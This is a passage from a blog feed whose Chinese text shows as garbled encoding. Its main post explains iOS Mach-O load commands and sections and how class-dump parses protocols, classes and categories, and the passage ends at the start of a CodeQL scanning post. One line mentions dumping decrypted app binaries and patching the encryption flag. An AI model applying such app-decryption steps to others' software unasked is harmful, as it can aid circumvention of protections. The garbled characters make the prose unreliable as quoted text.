æ³•è¯†åˆ«å®ƒï¼Œç¨‹åºå°±ä¼šå‡ºé”™ã€‚</li><li><strong>LC_SYMTAB</strong>ï¼šä¸ºæ–‡ä»¶å®šä¹‰ç¬¦å·è¡¨å’Œå­—ç¬¦ä¸²è¡¨ï¼Œåœ¨é“¾æ¥æ–‡ä»¶æ—¶è¢«é“¾æ¥å™¨ä½¿ç”¨ï¼ŒåŒæ—¶ä¹Ÿç”¨äºè°ƒè¯•å™¨æ˜ å°„ç¬¦å·åˆ°æºæ–‡ä»¶ã€‚ç¬¦å·è¡¨å®šä¹‰çš„æœ¬åœ°ç¬¦å·ä»…ç”¨äºè°ƒè¯•ï¼Œè€Œå·²å®šä¹‰å’Œæœªå®šä¹‰çš„externalç¬¦å·è¢«é“¾æ¥å™¨ä½¿ç”¨ã€‚</li><li>LC_DYSYMTAB:å°†ç¬¦å·è¡¨ä¸­ç»™å‡ºç¬¦å·çš„é¢å¤–ç¬¦å·ä¿¡æ¯æä¾›ç»™åŠ¨æ€é“¾æ¥å™¨ã€‚</li><li><strong>LC_LOAD_DYLINKER</strong>ï¼šé»˜è®¤çš„åŠ è½½å™¨è·¯å¾„ã€‚ <code>/usr/lib/dyld</code></li><li>LC_UUIDï¼šç”¨äºæ ‡è¯†MachOæ–‡ä»¶çš„IDï¼Œä¹Ÿç”¨äºå´©æºƒå †æ ˆå’Œç¬¦å·æ–‡ä»¶çš„å¯¹åº”è§£æã€‚</li><li>LC_VERSION_MIN_IPHONEOSï¼šç³»ç»Ÿè¦æ±‚çš„æœ€ä½ç‰ˆæœ¬ã€‚</li><li>LC_SOURCE_VERSIONï¼šæ„å»ºäºŒè¿›åˆ¶æ–‡ä»¶çš„æºä»£ç ç‰ˆæœ¬å·ã€‚</li><li>LC_MAINï¼šç¨‹åºçš„å…¥å£ã€‚dyldè·å–è¯¥åœ°å€ï¼Œç„¶åè·³è½¬åˆ°è¯¥å¤„æ‰§è¡Œã€‚</li><li><strong>LC_ENCRYPTION_INFO_64</strong>ï¼šæ–‡ä»¶æ˜¯å¦åŠ å¯†çš„æ ‡å¿—ï¼ŒåŠ å¯†å†…å®¹çš„åç§»å’Œå¤§å°ã€‚<ul><li>lldb dump ç ¸å£³ä¿®å¤æ–‡ä»¶ä¹‹åï¼Œéœ€è¦ä¿®æ”¹è¯¥æ ‡è¯†ä½ä»¥ç¡®ä¿æ­£å¸¸åæ±‡ç¼–æ–‡ä»¶ã€‚</li></ul></li><li>LC_LOAD_DYLIB:ä¾èµ–çš„åŠ¨æ€åº“ï¼ŒåŒ…æ‹¬åŠ¨æ€åº“åç§°ã€å½“å‰ç‰ˆæœ¬å·ã€å…¼å®¹ç‰ˆæœ¬å·ã€‚<ul><li>â€œotool -L xxxâ€å‘½ä»¤æŸ¥çœ‹</li></ul></li><li>LC_RPATHï¼š Runpath Search Paths, @rpath æœç´¢çš„è·¯å¾„ã€‚</li><li>LC_FUNCTION_STARTSï¼šå‡½æ•°èµ·å§‹åœ°å€è¡¨ï¼Œä½¿è°ƒè¯•å™¨å’Œå…¶ä»–ç¨‹åºèƒ½å¾ˆå®¹æ˜“åœ°çœ‹åˆ°ä¸€ä¸ªåœ°å€æ˜¯å¦åœ¨å‡½æ•°å†…ã€‚</li><li>LC_DATA_IN_CODEï¼šå®šä¹‰åœ¨ä»£ç æ®µå†…çš„éæŒ‡ä»¤çš„è¡¨ã€‚</li><li><strong>LC_CODE_SIGNATURE</strong>ï¼šä»£ç ç­¾åä¿¡æ¯ã€‚<ul><li>codesign -d [filename]</li></ul></li></ul><h2 id="Data-Segments"><a href="#Data-Segments" class="headerlink" title="Data-Segments"></a>Data-Segments</h2><p>å„ç§èŠ‚åŒºï¼Œæ¯”å¦‚ä»£ç æ®µï¼Œæ•°æ®æ®µï¼Œåªè¯»æ•°æ®æ®µç­‰ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.19.59@2x.png" alt="CleanShot 2021-07-11 at 15.19.59@2x"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°å¾ˆå¤š<code>__DATA, __objc__?</code> èŠ‚åŒºï¼Œ<code>Symbol Table</code> <code>String Table</code>ä¹Ÿå•ç‹¬åˆ—äº†å‡ºæ¥ã€‚</p><ul><li>__objc_protolist</li><li>__objc_classlist</li><li>__objc_catlist section</li><li>â€¦</li></ul><p>è¿™äº›èŠ‚åŒºä¿å­˜äº†OCä¸­ç±»åï¼Œå‡½æ•°åç­‰ä¿¡æ¯ï¼Œè¿™å°±ä¸ºä»MachOä¸­dumpå‡ºæ¥å¤´æ–‡ä»¶æ‰“ä¸‹äº†åŸºç¡€ã€‚</p><h2 id="Get-class-info-from-macho-file"><a href="#Get-class-info-from-macho-file" class="headerlink" title="Get class info from macho file"></a>Get class info from macho file</h2><p><code>__DATA, __objc_protolist</code>èŠ‚åŒºï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.30.45@2x.png" alt="CleanShot 2021-07-11 at 15.30.45@2x"></p><p>å­˜å‚¨çš„éƒ½æ˜¯æŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ªåˆä¸€ä¸ªprotocolçš„ç»“æ„ï¼Œå¯ä»¥å‚è€ƒobjcçš„ä»£ç  : </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">protocol_t</span> :</span> objc_object &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *mangledName;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">protocol_list_t</span> *<span class="title">protocols</span>;</span></span><br><span class="line">    <span class="keyword">method_list_t</span> *instanceMethods;</span><br><span class="line">    <span class="keyword">method_list_t</span> *classMethods;</span><br><span class="line">    <span class="keyword">method_list_t</span> *optionalInstanceMethods;</span><br><span class="line">    <span class="keyword">method_list_t</span> *optionalClassMethods;</span><br><span class="line">    <span class="keyword">property_list_t</span> *instanceProperties;</span><br><span class="line">    <span class="keyword">uint32_t</span> size;   <span class="comment">// sizeof(protocol_t)</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line">    <span class="comment">// Fields below this point are not always present on disk.</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> **_extendedMethodTypes;</span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">objc_object</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">isa_t</span> isa;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŒ‰ç…§ç»“æ„ä½“ç´¢å¼• <code>__DATA, __objc_protolist</code> é‡ŒæŒ‡é’ˆæŒ‡å‘çš„ä½ç½®çš„æ•°æ®ï¼Œå°±å¯ä»¥è§£æå‡ºæ¥protocolçš„ç±»å‹ï¼Œåå­—ï¼Œæ–¹æ³•ç­‰ä¿¡æ¯ã€‚</p><h1 id="class-dump-read-notes"><a href="#class-dump-read-notes" class="headerlink" title="class-dump read notes"></a>class-dump read notes</h1><h2 id="env"><a href="#env" class="headerlink" title="env"></a>env</h2><p>macos11.4 + xcode12</p><h2 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h2><p>Q : <code>openssl/aes.h</code> not found</p><p>A :  add header file path</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export LDFLAGS=<span class="string">&quot;-L/usr/local/opt/openssl/lib&quot;</span></span><br><span class="line">export CPPFLAGS=<span class="string">&quot;-I/usr/local/opt/openssl/include&quot;</span></span><br></pre></td></tr></table></figure><p>XCodeä¸­çš„é…ç½®æ˜¯:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/111.png" alt="111"></p><p>Q : Library not found for -lcrypto</p><p>A :  add the missing dylib</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/fix_crypto.png" alt="fix_crypto"></p><h2 id="raed-amp-amp-debug"><a href="#raed-amp-amp-debug" class="headerlink" title="raed &amp;&amp; debug"></a>raed &amp;&amp; debug</h2><p>æ ¸å¿ƒé€»è¾‘å°±çœ‹</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="keyword">void</span>)processObjectiveCData;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (CDMachOFile *machOFile <span class="keyword">in</span> <span class="keyword">self</span>.machOFiles) &#123;</span><br><span class="line">        CDObjectiveCProcessor *processor = [[[machOFile processorClass] alloc] initWithMachOFile:machOFile];</span><br><span class="line">        [processor process];</span><br><span class="line">        [_objcProcessors addObject:processor];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">- (<span class="keyword">void</span>)process;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">self</span>.machOFile.isEncrypted == <span class="literal">NO</span> &amp;&amp; <span class="keyword">self</span>.machOFile.canDecryptAllSegments) &#123;</span><br><span class="line">        [<span class="keyword">self</span>.machOFile.symbolTable loadSymbols];</span><br><span class="line">        [<span class="keyword">self</span>.machOFile.dynamicSymbolTable loadSymbols];</span><br><span class="line"></span><br><span class="line">        [<span class="keyword">self</span> loadProtocols];</span><br><span class="line">        [<span class="keyword">self</span>.protocolUniquer createUniquedProtocols];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Load classes before categories, so we can get a dictionary of classes by address.</span></span><br><span class="line">        [<span class="keyword">self</span> loadClasses];</span><br><span class="line">        [<span class="keyword">self</span> loadCategories];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-symbolTable-loadSymbols"><a href="#1-symbolTable-loadSymbols" class="headerlink" title="1. symbolTable loadSymbols"></a>1. symbolTable loadSymbols</h2><p>Load Commands é‡Œæ‰¾åˆ° LC_SYMTABï¼Œç„¶åæ‰¾åˆ° __DATA(ä¾èµ–å±æ€§ RW)ã€‚</p><p>ç„¶ååˆ©ç”¨ LC_SYMTAB åˆå§‹åŒ–äº†cursorå¼€å§‹éå†æ‰¾ç¬¦å·ã€‚</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.47.33@2x.png" alt="CleanShot 2021-07-11 at 15.47.33@2x"></p><p>strtab ä» string table å¼€å§‹ ï¼š ä¸€ä¸ª symbolèµ·å§‹ä½ç½®ï¼Œä¸€ä¸ªstringèµ·å§‹ä½ç½®ã€‚</p><p>ç„¶åæ ¹æ® arm è¿˜æ˜¯ x64 èµ°ä¸åŒçš„é€»è¾‘(è¿™é‡Œç›®æ ‡æ˜¯ARM64çš„Binary) : </p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-11%20at%2015.48.18@2x.png" alt="CleanShot 2021-07-11 at 15.48.18@2x"></p><p>å¼€å§‹è§£æ symbol tableï¼Œitem by item</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string table index  --&gt;  åœ¨string tableé‡Œæ‰¾åˆ°å¯¹åº”çš„ string</span><br><span class="line">type</span><br><span class="line">section index</span><br><span class="line">desc</span><br><span class="line">value</span><br></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®string table indexé‡Œæ‰¾åˆ°å¯¹åº”çš„stringï¼Œæ”¾åˆ°symbolsæ•°ç»„é‡Œï¼Œ</p><p>æ ¹æ® string çš„ value åˆ¤æ–­æ˜¯ä¸æ˜¯ classï¼Œè¿™é‡Œæ˜¯æ ¹æ®å­—ç¬¦ä¸²çš„å¼€å¤´æ˜¯ä¸æ˜¯<code>  @&quot;*OBJC_CLASS*$_&quot;</code>ã€‚</p><p>å¯¹äºè§£æå‡ºæ¥class nameï¼Œæ·»åŠ åˆ° class symbols dicté‡Œï¼Œ<strong>è¿™æ ·å¤„ç†ä¹‹åï¼Œsymbolsï¼Œ classSymbolséƒ½æœ‰äº†ã€‚</strong></p><h2 id="2-dynamicSymbolTable-loadsymbols"><a href="#2-dynamicSymbolTable-loadsymbols" class="headerlink" title="2. dynamicSymbolTable loadsymbols"></a>2. dynamicSymbolTable loadsymbols</h2><p>ç±»ä¼¼1</p><h2 id="3-loadProtocols"><a href="#3-loadProtocols" class="headerlink" title="3. loadProtocols"></a>3. loadProtocols</h2><p>ä» <code>__DATA , __objc_protolist</code> è¯»å– å¯¹åº”çš„value</p><p>æ¯”å¦‚å¾—åˆ°åœ°å€0x1009ccc58</p><p>èµ°åˆ° <code>- (CDOCProtocol *)protocolAtAddress:(uint64_t)address</code></p><p>åˆå§‹åŒ–å¯¹åº”çš„<code>CDOCProtocol</code>å¯¹è±¡</p><p>ä¾èµ–è¿™ä¸ªåœ°å€ï¼Œä»æ–‡ä»¶å¯¹åº”åœ°å€è¯»å–å‡ºæ¥ è¿™ä¸ª <code>proto</code>çš„ç›¸å…³ä¿¡æ¯:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct cd_objc2_protocol objc2Protocol;</span><br><span class="line">objc2Protocol.isa                     = [cursor readPtr];</span><br><span class="line">objc2Protocol.name                    = [cursor readPtr];</span><br><span class="line">objc2Protocol.protocols               = [cursor readPtr];</span><br><span class="line">objc2Protocol.instanceMethods         = [cursor readPtr];</span><br><span class="line">objc2Protocol.classMethods            = [cursor readPtr];</span><br><span class="line">objc2Protocol.optionalInstanceMethods = [cursor readPtr];</span><br><span class="line">objc2Protocol.optionalClassMethods    = [cursor readPtr];</span><br><span class="line">objc2Protocol.instanceProperties      = [cursor readPtr];</span><br><span class="line">objc2Protocol.size                    = [cursor readInt32];</span><br><span class="line">objc2Protocol.flags                   = [cursor readInt32];</span><br><span class="line">objc2Protocol.extendedMethodTypes     = 0;</span><br></pre></td></tr></table></figure><p>name protocolsè¿™äº›å­—æ®µæ˜¯ä¸€ä¸ªåœ°å€ï¼ŒæŒ‡å‘å¯¹åº”çš„å€¼(å­—ç¬¦ä¸²/æ•°ç»„)</p><p>æœ€åå‚ç…§objc2Protocolçš„å€¼ï¼Œåˆ†åˆ«è·å–protocol çš„ nameï¼Œ å„ç§methodsï¼Œå±æ€§ç­‰ï¼Œåˆå§‹åŒ–äº†protocolå¯¹è±¡</p><p>æ‰€ä»¥protocolså°±éƒ½å¤„ç†å‡ºæ¥äº†ï¼Œæœ€åå¾—åˆ°äº†</p><p><code>_protocolsByAddress __NSDictionaryM *   6781 key/value pairs    0x0000000112f93820</code></p><h2 id="4-protocolUniquer-createUniquedProtocols"><a href="#4-protocolUniquer-createUniquedProtocols" class="headerlink" title="4. protocolUniquer createUniquedProtocols"></a>4. protocolUniquer createUniquedProtocols</h2><p>ä¾èµ–3ä¸­æ‰¾åˆ°çš„ <code>_protocolsByAddress</code></p><p>name -&gt; protocol å¯¹åº”å…³ç³»çš„dict addr -&gt; protocol å¯¹åº”å…³ç³»çš„dict</p><p>p1-&gt;protocols é‡Œè¿˜æœ‰protocolï¼Œmergeè¿›æ¥(adopted protocols)</p><ul><li><p>p1 : _name   __NSCFString *  @â€AWEFriendsActivityWidgetConfigurationIntentHandlingâ€  0x0000000112fbc710</p></li><li><p>p2 : _name   NSTaggedPointerString * @â€NSObjectâ€ 0x07518ee6ed78d7f9</p></li></ul><p>@interface AWEFriendsActivityWidgetConfigurationIntentHandling : NSObject { //blablablaâ€¦ }</p><p>è¿™ç§æƒ…å†µ</p><h2 id="5-loadClasses"><a href="#5-loadClasses" class="headerlink" title="5. loadClasses"></a>5. loadClasses</h2><p>è§£æsection ï¼š<code> __DATA   __objc_classlist</code></p><p>å’Œ3ç±»ä¼¼çš„å¥—è·¯ï¼Œå…ˆå¾—åˆ° ä¸€ä¸ª åœ°å€ï¼Œç„¶åæ ¹æ®åœ°å€ï¼Œå»æ–‡ä»¶ä¸­ç´¢å¼•å¯¹åº”çš„ç»“æ„ï¼š</p><p><code>CDOCClass *aClass = [self loadClassAtAddress:val]</code></p><p>åªè°ƒè¯•ä¸€æ¬¡è¿‡ç¨‹åˆ†æå³å¯:<code> val uint64_t    4335166480 In [2]: hex(4335166480) Out[2]: &#39;0x102656410&#39;</code></p><p>è¿™ä¸ª0x102656410ï¼Œä½¿ç”¨machoviewä¹Ÿèƒ½çœ‹åˆ°ï¼Œè°ƒè¯•+machoviewå¯¹æ¯”çœ‹ï¼Œæ›´å®¹æ˜“ç†è§£ã€‚</p><p><code>loadClassAtAddress</code>æ–¹æ³•åˆ†æï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struct cd_objc2_class objc2Class;</span><br><span class="line">objc2Class.isa        = [cursor readPtr];</span><br><span class="line">objc2Class.superclass = [cursor readPtr];</span><br><span class="line">objc2Class.cache      = [cursor readPtr];</span><br><span class="line">objc2Class.vtable     = [cursor readPtr];</span><br><span class="line">objc2Class.data       = [cursor readPtr];</span><br><span class="line">objc2Class.reserved1  = [cursor readPtr];</span><br><span class="line">objc2Class.reserved2  = [cursor readPtr];</span><br><span class="line">objc2Class.reserved3  = [cursor readPtr];</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯è¯»å–å¯¹åº”çš„classç»“æ„ï¼Œè¿™ä¸ªè¿‡ç¨‹å…¶å®å¾ˆçœ¼ç†Ÿï¼Œå¦‚æœè¯»è¿‡iOSé€†å‘çš„ä¹¦ï¼Œæ¯”å¦‚åº†ç¥çš„ä¹¦ï¼Œæœ‰ä¸€ç« ä»‹ç»ocæ–¹æ³•è°ƒç”¨è¿‡ç¨‹çš„ï¼Œä¼šæŠŠoc-&gt;cppä»£ç ï¼Œé‚£é‡Œé¢è¿™ä¸ª oc objectçš„ç»“æ„åˆ†æçš„å¾ˆæ¸…æ¥šã€‚</p><p>ç„¶åè§£æ<code> class-&gt;data</code> å­—æ®µ</p><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cd_objc2_class_ro_t objc2ClassData;</span><br><span class="line">objc2ClassData.flags         = [cursor readInt32];</span><br><span class="line">objc2ClassData.instanceStart = [cursor readInt32];</span><br><span class="line">objc2ClassData.instanceSize  = [cursor readInt32];</span><br><span class="line"><span class="keyword">if</span> ([<span class="keyword">self</span>.machOFile uses64BitABI])</span><br><span class="line">    objc2ClassData.reserved  = [cursor readInt32];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    objc2ClassData.reserved = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">objc2ClassData.ivarLayout     = [cursor readPtr];</span><br><span class="line">objc2ClassData.name           = [cursor readPtr];</span><br><span class="line">objc2ClassData.baseMethods    = [cursor readPtr];</span><br><span class="line">objc2ClassData.baseProtocols  = [cursor readPtr];</span><br><span class="line">objc2ClassData.ivars          = [cursor readPtr];</span><br><span class="line">objc2ClassData.weakIvarLayout = [cursor readPtr];</span><br><span class="line">objc2ClassData.baseProperties = [cursor readPtr];</span><br></pre></td></tr></table></figure><p>ç„¶åå¾—åˆ°class çš„ nameï¼Œmethodsï¼Œprotocol, propertyä¿¡æ¯ ç„¶åè¿”å›è¿™ä¸ªclass</p><p>å±•å¼€è¯´ä¸‹ è·å– methods &amp;&amp; propertyçš„æ—¶å€™</p><ul><li><code>(NSArray *)loadMethodsAtAddress:(uint64_t)address; &#123; return [self loadMethodsAtAddress:address extendedMethodTypesCursor:nil]; &#125;</code></li></ul><p><code>loadMethodsAtAddress :</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">objc2Method.name  = [cursor readPtr];</span><br><span class="line">objc2Method.types = [cursor readPtr];</span><br><span class="line">objc2Method.imp   = [cursor readPtr];</span><br><span class="line">NSString *name    = [self.machOFile stringAtAddress:objc2Method.name];</span><br><span class="line">NSString *types   = [self.machOFile stringAtAddress:objc2Method.types];</span><br></pre></td></tr></table></figure><p>ä¸€æ ·çš„å¥—è·¯ï¼Œéƒ½æ˜¯è§£æå‡ºæ¥å¯¹åº”çš„å­—æ®µï¼Œç„¶åæŒ‰ç…§è¿™äº›å­—æ®µè¯»å–ä¿¡æ¯<code>(string) CDOCMethod *method = [[CDOCMethod alloc] initWithName:name typeString:types address:objc2Method.imp]; [methods addObject:method]; </code>æœ€åè·å¾—methodsæ•°ç»„ï¼Œç»™å‰é¢å¡«å……classçš„åœ°æ–¹ä½¿ç”¨</p><p><code>loadIvarsAtAddress ,loadPropertiesAtAddress , loadMethodsOfMetaClassAtAddress</code> åŒç†</p><p>è‡³æ­¤ï¼Œclassè§£æå®Œæ¯•</p><h2 id="6-loadCategories"><a href="#6-loadCategories" class="headerlink" title="6. loadCategories"></a>6. loadCategories</h2><p>å…³äºCategories å¯ä»¥çœ‹ <a href="https://zhuanlan.zhihu.com/p/24925196">https://zhuanlan.zhihu.com/p/24925196</a></p><p>å¤„ç†<code> __DATA __objc_catlist section</code> : </p><ul><li>(CDOCCategory *)loadCategoryAtAddress:(uint64_t)address;</li></ul><p>ä¸€æ ·çš„å¤„ç†æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struct cd_objc2_category objc2Category;</span><br><span class="line">objc2Category.name               = [cursor readPtr];</span><br><span class="line">objc2Category.class              = [cursor readPtr];</span><br><span class="line">objc2Category.instanceMethods    = [cursor readPtr];</span><br><span class="line">objc2Category.classMethods       = [cursor readPtr];</span><br><span class="line">objc2Category.protocols          = [cursor readPtr];</span><br><span class="line">objc2Category.instanceProperties = [cursor readPtr];</span><br><span class="line">objc2Category.v7                 = [cursor readPtr];</span><br><span class="line">objc2Category.v8                 = [cursor readPtr];</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å’Œå¯¹objc2Classçš„å¤„ç†æœ‰ç‚¹åƒï¼Œå°±æ˜¯å› ä¸ºæ˜¯categoryçš„åŸå› ï¼Œæ‰€ä»¥å­—æ®µæœ‰ä¸åŒï¼Œ ç®€å•çš„ç†è§£æˆ å¤„ç†ä¸€ç§ç‰¹æ®Šçš„classï¼Œå¹¶ä¸”æå–å‡ºç›¸åº”çš„ methods å’Œ propertieså°±è¡Œ</p><p>è‡³æ­¤æ•´ä¸ª processå‡½æ•°çš„å¤„ç†ç»“æŸ</p><h2 id="7-å¤„ç†-or-è¾“å‡º"><a href="#7-å¤„ç†-or-è¾“å‡º" class="headerlink" title="7. å¤„ç† or è¾“å‡º"></a>7. å¤„ç† or è¾“å‡º</h2><p>è¿™éƒ¨åˆ†ä¸»è¦æ˜¯å¤„ç†è¾“å‡ºäº†ï¼Œå¦‚æœæ²¡ä»€ä¹ˆå‚æ•°å°±ç›´æ¥stdoutè¾“å‡ºï¼Œå¦‚æœæœ‰æŒ‡å®šæ–‡ä»¶ç›®å½•ï¼Œå°±éå†ä¹‹å‰processå¾—åˆ°çš„ä¿¡æ¯ï¼Œå†™æ–‡ä»¶(.h)åˆ°æŒ‡å®šçš„ç›®å½•ã€‚</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/output.png" alt="output"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://zhuanlan.zhihu.com/p/24925196">https://zhuanlan.zhihu.com/p/24925196</a></p><p><a href="https://en.wikipedia.org/wiki/Mach-O">https://en.wikipedia.org/wiki/Mach-O</a></p><p><a href="https://iosre.com/">https://iosre.com/</a></p><p><a href="https://evilpan.com/2020/09/06/macho-inside-out/">https://evilpan.com/2020/09/06/macho-inside-out/</a></p><p>iOSåº”ç”¨é€†å‘ä¸å®‰å…¨ (åˆ˜åŸ¹åº†è‘—)</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;roadmap&quot;&gt;&lt;a href=&quot;#roadmap&quot; class=&quot;headerlink&quot; title=&quot;roadmap&quot;&gt;&lt;/a&gt;roadmap&lt;/h1&gt;&lt;p&gt;ä¹‹å‰åœ¨ &lt;a href=&quot;https://iosre.com/&quot;&gt;iosre&lt;/a&gt;çœ‹åˆ°ä¸€å¼ æ¯”è¾ƒç³»ç»Ÿçš„iOSé€†å‘å­¦ä¹ è·¯çº¿å›¾ï¼Œå› ä¸ºæ¥è§¦è¿‡ä¸€æ®µæ—¶é—´macOSä¸ŠæœåŠ¡çš„æ¼æ´æŒ–æ˜ï¼Œæ‰€ä»¥å¯¹*OSå®‰å…¨è¿˜æ˜¯æŒºæœ‰å…´è¶£çš„ï¼Œä¹Ÿä¸€ç›´æƒ³ç³»ç»Ÿæ€§åœ°å­¦ä¹ ä¸‹iOSé€†å‘ï¼Œä¹‹å‰çš„ä¸€ç›´ä¸æˆä½“ç³»ï¼Œä¹Ÿå¾ˆé›¶ç¢ï¼Œæ­£å¥½å¯¹ç€è¿™ä¸ªå›¾é‡æ„ä¸‹çŸ¥è¯†ä½“ç³»ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="iOS" scheme="https://o0xmuhe.github.io/categories/iOS/"/>
    
    
    <category term="iOS" scheme="https://o0xmuhe.github.io/tags/iOS/"/>
    
    <category term="é€†å‘" scheme="https://o0xmuhe.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL JS/TS Journey</title>
    <link href="https://o0xmuhe.github.io/2021/06/01/CodeQL-JS-TS-Journey/"/>
    <id>https://o0xmuhe.github.io/2021/06/01/CodeQL-JS-TS-Journey/</id>
    <published>2021-06-01T03:43:11.000Z</published>
    <updated>2021-06-09T14:33:55.580Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å…³äº"><a href="#å…³äº" class="headerlink" title="å…³äº"></a>å…³äº</h1><p>ä¹‹å‰åšè¿‡çš„ä¸€äº›ä½¿ç”¨CodeQLå¯¹JS/TSé¡¹ç›®åšæ‰«æçš„ç¬”è®°ã€‚</p><a id="more"></a><h1 id="å…³äºæ„å»ºæ•°æ®åº“è¿‡ç¨‹"><a href="#å…³äºæ„å»ºæ•°æ®åº“è¿‡ç¨‹" class="headerlink" title="å…³äºæ„å»ºæ•°æ®åº“è¿‡ç¨‹"></a>å…³äºæ„å»ºæ•°æ®åº“è¿‡ç¨‹</h1><p>å¯¹äºJS/TSçš„é¡¹ç›®æ¥è¯´ï¼ŒCodeQLç»Ÿä¸€éƒ½æ˜¯ <code>--language=javascript</code> çš„å‚æ•°å¤„ç†çš„ï¼Œè€Œä¸”å®ƒä¸»è¦æ˜¯æ‰«æï¼Œè§£æï¼Œç„¶åæ„å»ºæ•°æ®åº“ï¼Œå¯¹äºå°é¡¹ç›®ç›´æ¥é»˜è®¤å‚æ•°åº”è¯¥æ˜¯okçš„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">codeql database create --language=javascript &lt;your_prj&gt;</span><br><span class="line"><span class="comment"># codeql database bundle -o &lt;your_prj_db&gt;.zip 